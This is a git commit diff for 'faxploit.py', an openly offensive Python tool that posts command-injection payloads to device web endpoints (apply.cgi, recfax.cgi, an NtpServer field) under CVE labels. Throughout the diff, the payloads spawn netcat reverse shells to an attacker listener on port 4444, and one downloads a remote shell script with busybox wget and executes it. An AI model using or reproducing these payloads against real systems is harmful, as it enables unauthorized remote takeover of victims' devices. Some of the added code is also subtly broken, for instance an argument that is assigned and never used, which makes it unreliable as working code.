c0ccf8cd9d9420046a0f2db5107169aa1e2ffda8
SirCryptic <48811414+SirCryptic@users.noreply.github.com>
2023-02-25 20:19:46 +0000

    Update faxploit.py

--- faxploit/faxploit.py
+++ faxploit/faxploit.py
@@ -22,13 +22,19 @@ def exploit_cve_2012_0992(target, listen):
                'NtpServer': f'{listen};nc {listen} 4444 -e /bin/bash'}
     requests.post(url, data=payload)
 
-# CVE-2006-3126 exploit function
-def exploit_cve_2006_3126(target, listen, file_path):
+# CVE-2006-3126 exploit function using apply.cgi
+def exploit_cve_2006_3126_apply(target, listen, file_path):
     url = f'http://{target}/apply.cgi'
     payload = {'submit_button': 'Diagnostic',
                'change_action': 'gozila_cgi',
                'submit_type': 'start_ping',
                'ip_addr': f'`/bin/busybox wget {file_path} -O /tmp/reverse_shell.sh; chmod +x /tmp/reverse_shell.sh; /tmp/reverse_shell.sh | nc {listen} 4444`'}
+    requests.post(url, data=payload)
+
+# CVE-2006-3126 exploit function using recfax.cgi
+def exploit_cve_2006_3126_recfax(target, listen):
+    url = f'http://{target}/cgi-bin/fax/recfax.cgi'
+    payload = {'REMOTE_ADDR': f'$(nc {listen} 4444 < /dev/tcp/{listen}/4444)'}
     requests.post(url, data=payload)
 
 # command-line arguments
@@ -37,7 +43,8 @@ parser.add_argument('-t', '--target', required=True, help='target IP address')
 parser.add_argument('-l', '--listen', required=True, help='listening IP address')
 parser.add_argument('-cve1', '--cve-2018-16741', action='store_true', help='test for CVE-2018-16741')
 parser.add_argument('-cve2', '--cve-2012-0992', action='store_true', help='test for CVE-2012-0992')
-parser.add_argument('-cve3', '--cve-2006-3126', action='store_true', help='test for CVE-2006-3126')
+parser.add_argument('-cve3a', '--cve-2006-3126-apply', action='store_true', help='test for CVE-2006-3126 using apply.cgi')
+parser.add_argument('-cve3r', '--cve-2006-3126-recfax', action='store_true', help='test for CVE-2006-3126 using recfax.cgi')
 parser.add_argument('-f', '--file-path', help='path of file to be sent to target')
 args = parser.parse_args()
 
@@ -51,9 +58,13 @@ if args.cve_2018_16741:
 if args.cve_2012_0992:
     exploit_cve_2012_0992(target_ip, listen_ip)
 
-if args.cve_2006_3126:
+if args.cve_2006_3126_apply:
     file_path = args.file_path
-    exploit_cve_2006_3126(target_ip, listen_ip, file_path)
+    exploit_cve_2006_3126_apply(target_ip, listen_ip, file_path)
+
+if args.cve_2006_3126_recfax:
+    file_path = args.file_path
+    exploit_cve_2006_3126_recfax(target_ip, listen_ip)
     
     # Example Usage:
     # python3 faxploit.py -t <target_ip> -l <listen_ip> -cve1
